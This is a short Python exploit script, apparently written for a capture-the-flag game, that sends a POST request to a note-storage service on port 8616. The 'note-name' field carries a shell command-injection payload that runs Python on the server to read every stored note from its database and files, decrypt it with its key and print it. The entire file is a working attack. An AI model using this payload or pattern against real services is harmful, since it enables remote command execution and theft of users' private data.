#!/usr/bin/env python3

import requests as req
import sys


spl = "\"|| python3 -c \"import db; from utility import *; notes = list(db.Note.select().dicts()); [print(decrypt(open('notes/' + note['name']).read(), note['key'])) for note in notes];"

host = sys.argv[1]
payload = {"note-name" : spl, "key" : ""}

try:
	r = req.post("http://%s:8616/note" % host, data=payload, timeout=8)
	print(r.text, flush=True)
except req.exceptions.Timeout:
	print("Timeout", flush=True)
